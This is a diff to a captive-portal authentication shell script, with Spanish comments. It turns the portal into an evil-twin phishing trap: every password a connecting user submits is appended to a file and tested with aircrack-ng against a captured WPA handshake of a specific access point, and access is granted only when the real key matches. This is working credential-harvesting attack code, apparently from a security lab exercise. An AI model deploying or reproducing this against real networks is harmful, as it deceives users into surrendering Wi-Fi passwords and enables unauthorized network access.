@@ -4,6 +4,13 @@
 #                 verificacion de que la contraseña metida sea la correcta.
 
 
+AP_MAC="A4:98:13:5B:64:E9"
+HANDSAHKE="/home/uo263762/handshake.cap"
+PASSWORD_FILE="password.lst"
+
+
+
+
 METHOD="$1"
 CLIENTMAC="$2"
 
@@ -13,22 +20,20 @@ case "$METHOD" in
                PASSWORD="$4"
                
                
+               # Guardamos la contraseña dada por el usuario.
+               echo "$4" >> PASSWORD_FILE
                # Comprobamos si la contraseña dada por el usuario es la correcta.
-               
-               
-               if [ "$USERNAME" = "Staff" -a "$PASSWORD" = "weneedit" ]; then
-                       # Allow Staff to access the Internet for the global sessiontimeout interval
-                       # Further values are reserved for upload and download limits in bytes. 0 for no limit.
-                       echo 0 0 0
-                       exit 0
-               elif [ "$USERNAME" = "Guest" -a "$PASSWORD" = "thanks" ]; then
-                       # Allow Guest to access the Internet for 10 minutes (600 seconds)
-                       # Further values are reserved for upload and download limits in bytes. 0 for no limit.
-                       echo 600 0 0
-                       exit 0
+               aircrack-ng -w $PASSWORD_FILE -b $AP_MAC $HANDSAHKE | grep "KEY FOUND!"
+               # ¿Es correcta?
+               if [ $? -eq 0 ]; then
+                     # Contraseña encontrada!
+                     echo 0 0 0
+                     echo "Bien!" >> bien.txt
+                     exit 0
                else
-                       # Deny client access to the Internet.
-                       exit 1
+                     # Contraseña incorrecta!
+                     echo "Mal!" >> mal.txt
+                     exit 1
                fi
 
                ;;
